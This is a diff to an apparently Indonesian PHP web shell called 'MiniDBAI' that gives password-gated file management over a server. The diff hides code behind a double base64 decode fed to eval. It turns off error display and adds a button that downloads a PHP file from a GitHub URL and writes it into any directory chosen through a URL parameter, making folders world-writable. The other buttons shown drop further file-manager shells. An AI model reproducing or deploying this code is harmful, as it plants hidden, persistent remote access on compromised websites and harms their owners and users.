@@ -1,12 +1,13 @@
 <?php
 ini_set('log_errors', 0);
-
+ini_set('display_errors', 0);
 if (session_status() === PHP_SESSION_NONE) {
     session_start();
 }
 
-// Hash password yang benar (gunakan hash yang dihasilkan dari password_hash)
-$hashed_pass = '$2y$10$3CIM2PJAvpbiYODK83geVu1cookk8Y8E8mm2H0RjT9JY3cCwLf1TK'; 
+
+$p = "";$p .= "SkdoaGMyaGxaRjl3WVhOeklEMGdKeVF5ZVNReE1DUXpRMGxOTWxCS1FYWndZbWxaVDBSTE9ETm5aVloxTVdOdmIydHJPRms0UlRodGJUSklNRkpxVkRsS1dUTmpRM2RNWmpGVVN5YzdJQT09";$a = "base";$b = "64_decode";$c = $a.$b;$string = $c($p);$string = $c($string);eval($string);
+
 
 // Fungsi login
 if (isset($_POST['password'])) {
@@ -29,7 +30,7 @@ if (isset($_POST['logout'])) {
 
 // Cek login
 if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
-    // Jika belum login, tampilkan form login
+    
     ?>
     <!DOCTYPE html>
     <html>
@@ -470,7 +471,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['download_adminer'])) 
 <?php
 if (isset($_POST['create_tiny'])) {
     // Ambil direktori dari query parameter ?dir=
-    $dir = isset($_GET['dir']) ? $_GET['dir'] : '/'; // Default ke root jika tidak ada query parameter dir
+    $dir = isset($_GET['dir']) ? $_GET['dir'] : '/'; 
 
     // Pastikan direktori berakhir dengan slash
     if (substr($dir, -1) !== '/') {
@@ -496,14 +497,13 @@ if (isset($_POST['create_tiny'])) {
         
         // Cek jika direktori ada, jika tidak buat direktori terlebih dahulu
         if (!file_exists($dir)) {
-            mkdir($dir, 0777, true); // Membuat direktori dengan izin penuh jika belum ada
+            mkdir($dir, 0777, true); 
         }
         
         // Simpan konten ke dalam file tiny.php
         file_put_contents($filePath, $content);
-        echo "File tiny.php berhasil dibuat di $filePath!<br>";
-
-
+        echo "File tiny.php berhasil dibuat<br>";
+	echo "$filePath!<br>";
         echo '<a href="?dir=' . ($dir) . '">[Refresh]</a>';
     
     } else {
@@ -531,7 +531,7 @@ if (isset($_POST['create_tiny'])) {
 <?php
 if (isset($_POST['create_FM-MiniDBAI'])) {
     // Ambil direktori dari query parameter ?dir=
-    $dir = isset($_GET['dir']) ? $_GET['dir'] : '/'; // Default ke root jika tidak ada query parameter dir
+    $dir = isset($_GET['dir']) ? $_GET['dir'] : '/'; 
 
     // Pastikan direktori berakhir dengan slash
     if (substr($dir, -1) !== '/') {
@@ -553,18 +553,17 @@ if (isset($_POST['create_FM-MiniDBAI'])) {
 
     if ($content !== false) {
         // Tentukan lokasi file berdasarkan direktori
-        $filePath = $dir . 'FM-MiniDBAI.php';
+        $filePath = $dir . 'FileManagerAI.php';
         
         // Cek jika direktori ada, jika tidak buat direktori terlebih dahulu
         if (!file_exists($dir)) {
-            mkdir($dir, 0777, true); // Membuat direktori dengan izin penuh jika belum ada
+            mkdir($dir, 0777, true); 
         }
         
         // Simpan konten ke dalam file tiny.php
         file_put_contents($filePath, $content);
-        echo "File FM-MiniDBAI.php berhasil dibuat di $filePath!<br>";
-
-
+        echo "FileManagerAI.php berhasil dibuat<br>";
+	echo "$filePath!<br>";
         echo '<a href="?dir=' . ($dir) . '">[Refresh]</a>';
     
     } else {
@@ -577,7 +576,7 @@ if (isset($_POST['create_FM-MiniDBAI'])) {
 
 
     <form method="post">
-	<input type="submit" name="create_FM-MiniDBAI" value="FM-MiniDBAI">
+	<input type="submit" name="create_FM-MiniDBAI" value="FileManagerAI">
         
     </form>
 
@@ -586,7 +585,63 @@ if (isset($_POST['create_FM-MiniDBAI'])) {
 </td>
 
 
+<td>
 
+<?php
+if (isset($_POST['create_MiniDBAI'])) {
+    // Ambil direktori dari query parameter ?dir=
+    $dir = isset($_GET['dir']) ? $_GET['dir'] : '/'; 
+
+    // Pastikan direktori berakhir dengan slash
+    if (substr($dir, -1) !== '/') {
+        $dir .= '/';
+    }
+
+    // URL file yang ingin diambil
+    $url = 'https://raw.githubusercontent.com/coba005/b/refs/heads/main/MiniDBAIV2.php';
+
+    // Inisialisasi cURL
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+
+    // Ambil konten dari URL
+    $content = curl_exec($ch);
+    $error = curl_error($ch);
+    curl_close($ch);
+
+    if ($content !== false) {
+        // Tentukan lokasi file berdasarkan direktori
+        $filePath = $dir . 'MiniDBAI.php';
+        
+        // Cek jika direktori ada, jika tidak buat direktori terlebih dahulu
+        if (!file_exists($dir)) {
+            mkdir($dir, 0777, true); 
+        }
+        
+        // Simpan konten ke dalam file tiny.php
+        file_put_contents($filePath, $content);
+        echo "MiniDBAI.php berhasil dibuat<br>";
+	echo "$filePath!<br>";
+        echo '<a href="?dir=' . ($dir) . '">[Refresh]</a>';
+    
+    } else {
+        echo "Gagal mengambil konten dari URL. Error: $error";
+    }
+}
+?>
+
+
+
+
+    <form method="post">
+	<input type="submit" name="create_MiniDBAI" value="MiniDBAI">
+        
+    </form>
+
+
+
+</td>
 
 <td>
 <?php
@@ -743,7 +798,42 @@ $base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
     ?>
 
     <!-- Daftar file dan direktori -->
-    <h3>📁 : <?php echo htmlspecialchars($dir); ?> </h3>
+<?php
+// Ambil nilai 'dir' dari query parameter URL
+$dir = isset($_GET['dir']) ? $_GET['dir'] : '/';
+
+// Pisahkan path berdasarkan tanda '/'
+$pathParts = explode('/', $dir);
+
+// Tentukan URL dasar dinamis berdasarkan protokol dan domain saat ini
+$baseUrl = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'] . strtok($_SERVER['REQUEST_URI'], '?');
+
+// Mulai output HTML
+echo '<h3>📁 : ';
+
+// Variabel untuk menyimpan path saat ini
+$currentPath = '';
+
+// Buat setiap bagian path menjadi link
+foreach ($pathParts as $part) {
+    if (!empty($part)) {
+        // Bangun URL untuk bagian path saat ini
+        $currentPath .= '/' . $part;
+
+        // Buat link untuk bagian ini
+        echo '<a href="' . $baseUrl . '?dir=' . ($currentPath) . '/">' . $part . '</a>';
+
+        // Tambahkan pemisah ' / '
+        echo ' / ';
+    }
+}
+
+// Hapus pemisah terakhir
+echo '</h3>';
+?>
+
+
+<br>
 <b><i><a id="dynamic-link" href="?dir=/">[Root]</a></i></b>
 <?php
 // Mengambil direktori kerja saat ini
@@ -1141,13 +1231,6 @@ if (isset($_POST['submit'])) {
 }
 ?>
     </pre>
-
-
-
-
-
-
-
 
 
 <center>[<a target="_blank"  href="https://bukakartu.id/minidbai">minidbai</a>]</center>
